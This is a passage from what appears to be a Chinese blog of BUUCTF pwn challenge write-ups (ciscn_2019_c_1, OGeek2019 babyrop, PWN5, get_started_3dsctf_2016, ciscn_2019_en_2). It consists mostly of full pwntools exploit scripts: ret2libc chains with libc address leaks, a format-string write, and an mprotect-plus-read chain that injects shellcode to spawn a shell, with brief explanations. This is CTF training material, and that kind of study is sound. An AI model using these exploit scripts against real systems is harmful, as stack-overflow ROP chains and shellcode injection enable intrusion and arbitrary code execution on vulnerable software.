class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./ciscn_2019_c_1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29497</span>)</span><br><span class="line"></span><br><span class="line">start = <span class="number">0x400B28</span></span><br><span class="line">rdi_addr = <span class="number">0x400c83</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice!&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;a&quot;</span>*<span class="number">0x58</span></span><br><span class="line">payload+=p64(rdi_addr)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(start)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;encrypted&quot;</span>,encrypt(payload))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">puts_leak = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;puts_addr = &#x27;</span> + <span class="built_in">hex</span>(puts_leak))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_leak)</span><br><span class="line">libc_base = puts_leak - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload1=<span class="string">&quot;a&quot;</span>*<span class="number">0x58</span></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">payload1+=p64(ret)</span><br><span class="line">payload1+=p64(rdi_addr)</span><br><span class="line">payload1+=p64(bin_sh_addr)</span><br><span class="line">payload1+=p64(sys_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice!&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;encrypted&quot;</span>,payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>还有一种写法，ret2csu也可。</p><h2 id="0x8-OGeek2019-babyrop"><a href="#0x8-OGeek2019-babyrop" class="headerlink" title="0x8.[OGeek2019]babyrop"></a>0x8.[OGeek2019]babyrop</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">yutao@pwnbaby:~/Desktop$ file pwn</span><br><span class="line">pwn: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6503b3ef34c8d55c8d3e861fb4de2110d0f9f8e2, stripped</span><br><span class="line">yutao@pwnbaby:~/Desktop$ checksec pwn</span><br><span class="line">[*] &#x27;/home/yutao/Desktop/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>首先要绕过验证：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )</span><br><span class="line">  read(fd, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">v2 = sub_804871F(buf);</span><br></pre></td></tr></table></figure><p>和上道题一样，可以用\x00来绕过。并且return的v5在buf数组后面，可以写</p><p>再之后就是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( a1 == <span class="number">127</span> )</span><br><span class="line">  result = read(<span class="number">0</span>, &amp;buf, <span class="number">0xC8</span>u);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  result = read(<span class="number">0</span>, &amp;buf, a1);</span><br></pre></td></tr></table></figure><p>这里的a1就是之前返回的v5（我们在buf后面复写的值），当然是越大越好，所以就0xff * 7</p><p>即：\x00 + 0xff  * 7</p><p>exp1：leak read</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28548</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x8048825</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;\xff&#x27;</span>*<span class="number">0x7</span></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露read的got地址</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span></span><br><span class="line"></span><br><span class="line">payload+=p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(read_got)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(read_addr)</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;read&#x27;</span>,read_addr)</span><br><span class="line">libc_base=read_addr-libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span></span><br><span class="line">payload+=p32(system_addr)+ p32(<span class="number">0xdeadbeef</span>)+p32(bin_sh_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>exp2:leak write</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*-coding=UTF-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28548</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x08048825</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">libc_system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">libc_binsh_addr = <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">libc_write_addr = libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">bypass_payload = <span class="string">&#x27;\x00&#x27;</span> <span class="comment">#bypass strncmp() </span></span><br><span class="line">bypass_payload += <span class="string">&#x27;\xff&#x27;</span>*<span class="number">7</span> </span><br><span class="line">sh.sendline(bypass_payload)</span><br><span class="line"></span><br><span class="line">offset2ebp = <span class="number">0xe7</span></span><br><span class="line">leak_payload = <span class="string">&#x27;a&#x27;</span>*offset2ebp + <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">leak_payload += p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Correct\n&#x27;</span>,leak_payload)</span><br><span class="line"></span><br><span class="line">leak_write_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">libc_baseaddr = leak_write_addr - libc_write_addr</span><br><span class="line">system_addr = libc_system_addr + libc_baseaddr</span><br><span class="line">binsh_addr = libc_binsh_addr + libc_baseaddr</span><br><span class="line"></span><br><span class="line">sh.sendline(bypass_payload)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*offset2ebp + <span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line">payload += p32(system_addr) + <span class="string">&#x27;retn&#x27;</span> + p32(binsh_addr)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Correct\n&#x27;</span>,payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x9-第五空间2019-决赛-PWN5"><a href="#0x9-第五空间2019-决赛-PWN5" class="headerlink" title="0x9.[第五空间2019 决赛]PWN5"></a>0x9.[第五空间2019 决赛]PWN5</h2><p>格式化字符串漏洞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25276</span>)</span><br><span class="line">dword_804C044 = <span class="number">0x804C044</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">10</span>,&#123;dword_804C044:<span class="number">0x1111</span>&#125;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x1111</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ cat flag</span><br><span class="line">[DEBUG] Sent 0x9 bytes:</span><br><span class="line">    &#x27;cat flag\n&#x27;</span><br><span class="line">[DEBUG] Received 0x2b bytes:</span><br><span class="line">    &#x27;flag&#123;18b6ca26-1d7d-407b-8b08-63dd66d4e775&#125;\n&#x27;</span><br><span class="line">flag&#123;18b6ca26-1d7d-407b-8b08-63dd66d4e775&#125;</span><br></pre></td></tr></table></figure><h2 id="0xA-get-started-3dsctf-2016"><a href="#0xA-get-started-3dsctf-2016" class="headerlink" title="0xA.get_started_3dsctf_2016"></a>0xA.get_started_3dsctf_2016</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ checksec  get_started_3dsctf_2016 </span><br><span class="line">[*] &#x27;/home/gwt/Desktop/get_started_3dsctf_2016&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">gwt@ubuntu:~/Desktop$ file get_started_3dsctf_2016 </span><br><span class="line">get_started_3dsctf_2016: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, not stripped</span><br></pre></td></tr></table></figure><p>两个有用的函数：</p><p>main中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">56</span>]; <span class="comment">// [esp+4h] [ebp-38h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Qual a palavrinha magica? &quot;</span>, v4[<span class="number">0</span>]);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有个get_flag：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">get_flag</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v3; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v5; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">814536271</span> &amp;&amp; a2 == <span class="number">425138641</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rt&quot;</span>);</span><br><span class="line">    v3 = getc(v2);</span><br><span class="line">    <span class="keyword">if</span> ( v3 != <span class="number">255</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = v3;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(v4);</span><br><span class="line">        v5 = getc(v2);</span><br><span class="line">        v4 = v5;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v5 != <span class="number">255</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(v2);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>本地不能通，看了国外的wp，应该是buu的问题</p><p>绕过if判断，直接到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">p=process(&#x27;./get_started_3dsctf_2016&#x27;)</span><br><span class="line">payload=&#x27;a&#x27;*0x38+p32(0x80489bb)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">q = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29154</span>)</span><br><span class="line"><span class="comment">#q = process(&#x27;./get_started_3dsctf_2016&#x27;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sleep(0.1)</span></span><br><span class="line">get_addr = <span class="number">0x080489A0</span></span><br><span class="line">exit_addr = <span class="number">0x0804E6A0</span></span><br><span class="line">a1 = <span class="number">814536271</span></span><br><span class="line">a2 = <span class="number">425138641</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">56</span>)</span><br><span class="line">payload += p32(get_addr) + p32(exit_addr)</span><br><span class="line">payload += p32(a1) + p32(a2)</span><br><span class="line">q.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">q.recv()</span><br></pre></td></tr></table></figure><h3 id="方法二：修改内存段的权限"><a href="#方法二：修改内存段的权限" class="headerlink" title="方法二：修改内存段的权限"></a>方法二：修改内存段的权限</h3><p>mprotect函数，可以修改内存段的权限</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mprotect</span><span class="params">(<span class="keyword">void</span> *addr, <span class="keyword">size_t</span> len, <span class="keyword">int</span> prot)</span></span>;</span><br><span class="line">addr 内存启始地址</span><br><span class="line">len  修改内存的长度</span><br><span class="line">prot 内存的权限</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line"> 0x8048000  0x80ea000 r-xp    a2000 0      /home/gwt/Desktop/get_started_3dsctf_2016</span><br><span class="line"> 0x80ea000  0x80ec000 rw-p     2000 a1000  /home/gwt/Desktop/get_started_3dsctf_2016</span><br><span class="line"> 0x80ec000  0x80ed000 rw-p     1000 0      </span><br><span class="line"> 0x844a000  0x846c000 rw-p    22000 0      [heap]</span><br><span class="line">0xf7ff6000 0xf7ff9000 r--p     3000 0      [vvar]</span><br><span class="line">0xf7ff9000 0xf7ffb000 r-xp     2000 0      [vdso]</span><br><span class="line">0xff9ba000 0xff9db000 rw-p    21000 0      [stack]</span><br></pre></td></tr></table></figure><p>思路：</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">栈溢出到mprotect函数（call==push+jmp）</span><br><span class="line">所以ret后要留一个返回地址，因为ret就相当于jmp到mprotect。</span><br><span class="line">payload大致为：</span><br><span class="line">payload = &#x27;a&#x27;*0x38+p32(mprotect_add)+p32(ret_add)</span><br><span class="line">payload+=p32(argu1) + p32(argu2) +p32 (argu3)</span><br><span class="line">第一个参数是被修改内存的地址：0x80ea000</span><br><span class="line">第二个参数是被修改内存的大小：必须是页的整数倍，0x1000</span><br><span class="line">第三参数值权限：0x7</span><br><span class="line">然后找个pop来平衡堆栈：</span><br><span class="line">ROPgadget --binary get_started_3dsctf_2016 --only &#x27;pop|ret&#x27;</span><br><span class="line">因为是3个参数，就找3个pop</span><br><span class="line">现在payload：</span><br><span class="line">payload = &#x27;a&#x27; + 0x38 + p32(mprotect_addr)</span><br><span class="line">payload += p32(pop3_addr) + p32(mem_addr) + p32(mem_size) +p32 (mem_proc)</span><br><span class="line">payload += p32(ret_addr2)</span><br><span class="line"></span><br><span class="line">ret_addr2是read函数的地址，将shellcode写入内存。</span><br><span class="line">read函数原型：</span><br><span class="line">ssize_t read(int fd, void *buf, size_t count);</span><br><span class="line">fd 设为0时就可以从输入端读取内容</span><br><span class="line">buf 设为我们想要执行的内存地址    </span><br><span class="line">size 适当大小，足够写入shellcode就OK</span><br></pre></td></tr></table></figure><p>​    完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line">pop3_ret = <span class="number">0x804951D</span></span><br><span class="line">mem_addr = <span class="number">0x80ec000</span> </span><br><span class="line">mem_size = <span class="number">0x1000</span>    </span><br><span class="line">mem_proc = <span class="number">0x7</span>       </span><br><span class="line"></span><br><span class="line">mprotect_addr = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read_addr = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">payload += p32(mprotect_addr)</span><br><span class="line">payload += p32(pop3_ret) </span><br><span class="line">payload += p32(mem_addr) </span><br><span class="line">payload += p32(mem_size)  </span><br><span class="line">payload += p32(mem_proc)   </span><br><span class="line">payload += p32(read_addr)</span><br><span class="line">payload += p32(pop3_ret)  </span><br><span class="line">payload += p32(<span class="number">0</span>)     </span><br><span class="line">payload += p32(mem_addr)   </span><br><span class="line">payload += p32(<span class="number">0x1000</span>) </span><br><span class="line">payload += p32(mem_addr) </span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">payload = asm(shellcraft.sh()) </span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="0xB-ciscn-2019-en-2"><a href="#0xB-ciscn-2019-en-2" class="headerlink" title="0xB.ciscn_2019_en_2"></a>0xB.ciscn_2019_en_2</h2><p>和ciscn_2019_c_1是一模一样的…</p><p>ret2libc.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./ciscn_2019_en_2&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29045</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_2019_en_2&quot;</span>)</span><br><span class="line">ret = <span class="number">0x04006b9</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0400c83</span></span><br><span class="line">main = <span class="number">0x400B28</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x58</span> * <span class="string">&#x27;a&#x27;</span>+ p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+ p64(main)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;choice!&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;encrypted&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Ciphertext&quot;</span>)</span><br><span class="line">io.recvline()</span><br><span class="line">io.recvline()</span><br><span class="line">puts_addr =u64(io.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)</span><br><span class="line">base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = base + libc.dump(<span 